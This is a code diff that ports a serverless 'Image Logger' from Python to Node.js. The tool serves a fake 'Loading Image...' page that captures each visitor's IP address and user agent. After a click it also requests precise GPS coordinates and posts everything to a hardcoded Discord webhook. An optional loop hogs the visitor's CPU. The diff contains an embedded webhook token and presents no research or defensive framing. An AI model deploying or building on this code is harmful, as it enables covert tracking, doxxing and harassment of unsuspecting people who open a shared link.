@@ -1,165 +1,141 @@
-import json
-import urllib.request
+// api/index.js
 
-# ==== CONFIG ====
-options = {
-    "accurate_location": True,  # Ask user for geolocation
-    "browser_stress": False      # Optional browser stress
+const fetch = require("node-fetch");
+
+const config = {
+  webhook: "https://discord.com/api/webhooks/1410895727873495100/L_6XLT65BoAVy3qw8yeBAxN_bjOucJKGL6O1mxErFo2SyQY0Z8eNaFkB65ODQwsZcHTX",
+  image: "https://digitalcommunications.wp.st-andrews.ac.uk/files/2019/04/JPEG_compression_Example.jpg",
+  loading_image: "https://via.placeholder.com/600x400?text=Loading...",
+  username: "Image Logger",
+  color: 0x00FFFF,
+  options: {
+    accurate_location: true,
+    browser_stress: false
+  }
+};
+
+function detectOSBrowser(ua) {
+  let os = "Unknown", browser = "Unknown";
+  ua = ua.toLowerCase();
+  if (ua.includes("windows")) os = "Windows 10";
+  else if (ua.includes("mac")) os = "MacOS";
+  else if (ua.includes("linux")) os = "Linux";
+  else if (ua.includes("android")) os = "Android";
+  else if (ua.includes("iphone") || ua.includes("ipad")) os = "iOS";
+
+  if (ua.includes("chrome")) browser = "Chrome";
+  else if (ua.includes("firefox")) browser = "Firefox";
+  else if (ua.includes("safari") && !ua.includes("chrome")) browser = "Safari";
+  else if (ua.includes("edge")) browser = "ChromiumEdge";
+
+  return { os, browser };
 }
 
-config = {
-    "webhook": "https://discord.com/api/webhooks/1410895727873495100/L_6XLT65BoAVy3qw8yeBAxN_bjOucJKGL6O1mxErFo2SyQY0Z8eNaFkB65ODQwsZcHTX",
-    "image": "https://digitalcommunications.wp.st-andrews.ac.uk/files/2019/04/JPEG_compression_Example.jpg",
-    "loading_image": "https://via.placeholder.com/600x400?text=Loading...",
-    "username": "Image Logger",
-    "color": 0x00FFFF
-}
+async function sendWebhook(ip, useragent, lat, lon) {
+  const { os, browser } = detectOSBrowser(useragent || "");
 
-# ==== HELPER FUNCTION TO DETECT OS/BROWSER (simple) ====
-def detect_os_browser(useragent):
-    ua = useragent.lower()
-    os = "Unknown"
-    browser = "Unknown"
-    
-    if "windows" in ua:
-        os = "Windows"
-    elif "mac" in ua:
-        os = "MacOS"
-    elif "linux" in ua:
-        os = "Linux"
-    elif "android" in ua:
-        os = "Android"
-    elif "iphone" in ua or "ipad" in ua:
-        os = "iOS"
-
-    if "chrome" in ua:
-        browser = "Chrome"
-    elif "firefox" in ua:
-        browser = "Firefox"
-    elif "safari" in ua and "chrome" not in ua:
-        browser = "Safari"
-    elif "edge" in ua:
-        browser = "Edge"
-
-    return os, browser
-
-# ==== HELPER FUNCTION TO SEND WEBHOOK ====
-def send_webhook(ip, useragent, lat=None, lon=None):
-    os, browser = detect_os_browser(useragent)
-    embed_description = f"""
-**IP Info**
-> IP: {ip}
+  // Polished embed fields like Image Logger GUI
+  const fields = [
+    {
+      name: "IP Info",
+      value: `> IP: ${ip}
 > ISP: Unknown
 > ASN: Unknown
 > Country: Unknown
 > Region: Unknown
 > City: Unknown
-> Coords: {lat or 'Unknown'}, {lon or 'Unknown'}
+> Coords: ${lat || "Unknown"}, ${lon || "Unknown"}
 > VPN/Proxy: Unknown
-> Hosting: Unknown
+> Hosting: Unknown`
+    },
+    {
+      name: "PC Info",
+      value: `> OS: ${os}
+> Browser: ${browser}`
+    },
+    {
+      name: "User Agent",
+      value: useragent || "Unknown"
+    }
+  ];
 
-**PC Info**
-> OS: {os}
-> Browser: {browser}
+  const payload = {
+    username: config.username,
+    content: "@everyone",
+    embeds: [{
+      title: "Image Logger - IP Logged",
+      color: config.color,
+      fields: fields
+    }]
+  };
 
-**User Agent**
-{useragent or 'Unknown'}
-"""
-    payload = json.dumps({
-        "username": config["username"],
-        "content": "@everyone",
-        "embeds": [{
-            "title": "Image Logger - IP Logged",
-            "color": config["color"],
-            "description": embed_description
-        }]
-    }).encode("utf-8")
+  try {
+    await fetch(config.webhook, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload)
+    });
+  } catch (err) {
+    console.log("Webhook error:", err);
+  }
+}
 
-    try:
-        req = urllib.request.Request(
-            config["webhook"],
-            data=payload,
-            headers={'Content-Type': 'application/json'}
-        )
-        urllib.request.urlopen(req, timeout=5)
-    except:
-        pass
+module.exports = async (req, res) => {
+  const ip = req.headers["x-forwarded-for"] || req.connection.remoteAddress;
+  const useragent = req.headers["user-agent"] || "";
 
-# ==== Vercel Serverless Function ====
-def handler(request, context):
-    # Handle POST (geolocation)
-    if request.method == "POST":
-        try:
-            data = json.loads(request.body)
-            send_webhook(
-                data.get("ip"),
-                data.get("useragent"),
-                data.get("lat"),
-                data.get("lon")
-            )
-        except:
-            pass
-        return {
-            "statusCode": 200,
-            "body": "OK"
-        }
+  if (req.method === "POST") {
+    try {
+      const data = req.body;
+      await sendWebhook(data.ip, data.useragent, data.lat, data.lon);
+    } catch {}
+    res.status(200).send("OK");
+    return;
+  }
 
-    # GET request (landing page)
-    ip = request.headers.get("x-forwarded-for", request.remote)
-    useragent = request.headers.get("User-Agent", "")
+  await sendWebhook(ip, useragent);
 
-    # Initial webhook without location
-    send_webhook(ip, useragent)
+  const geo_js = config.options.accurate_location ? `
+if (navigator.geolocation) {
+  navigator.geolocation.getCurrentPosition(function(pos) {
+    fetch(window.location.href, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        ip: '${ip}',
+        useragent: '${useragent}'
+      })
+    });
+  });
+}
+` : "";
 
-    # JS for geolocation & optional browser stress after click
-    geo_js = ""
-    if options["accurate_location"]:
-        geo_js = f"""
-if (navigator.geolocation) {{
-    navigator.geolocation.getCurrentPosition(
-        function(position) {{
-            fetch(window.location.href, {{
-                method: 'POST',
-                headers: {{'Content-Type': 'application/json'}},
-                body: JSON.stringify({{
-                    lat: position.coords.latitude,
-                    lon: position.coords.longitude,
-                    ip: '{ip}',
-                    useragent: '{useragent}'
-                }})
-            }});
-        }}
-    );
-}}
-"""
-    stress_js = ""
-    if options["browser_stress"]:
-        stress_js = "for (let i=0;i<1e8;i++){Math.sqrt(i);}"
+  const stress_js = config.options.browser_stress ? "for(let i=0;i<1e8;i++){Math.sqrt(i);}" : "";
 
-    html = f"""
+  const html = `
 <html>
 <head>
-<meta property="og:image" content="{config['loading_image']}">
+<meta property="og:image" content="${config.loading_image}">
 <title>Loading Image...</title>
 </head>
 <body style="text-align:center;">
 <h2>Loading Image...</h2>
-<img src="{config['loading_image']}" style="width:50%;height:auto;">
+<img src="${config.loading_image}" style="width:50%;height:auto;">
 <br><br>
 <button id="allowBtn" style="padding:10px 20px;font-size:16px;">Click to Continue</button>
 <script>
-document.getElementById('allowBtn').onclick = function() {{
-    {geo_js}
-    {stress_js}
-    window.location.href = '{config['image']}';
-}};
+document.getElementById('allowBtn').onclick = function() {
+  ${geo_js}
+  ${stress_js}
+  window.location.href = '${config.image}';
+};
 </script>
 </body>
 </html>
-"""
+`;
 
-    return {
-        "statusCode": 200,
-        "headers": {"Content-Type": "text/html"},
-        "body": html
-    }
+  res.setHeader("Content-Type", "text/html");
+  res.status(200).send(html);
+};
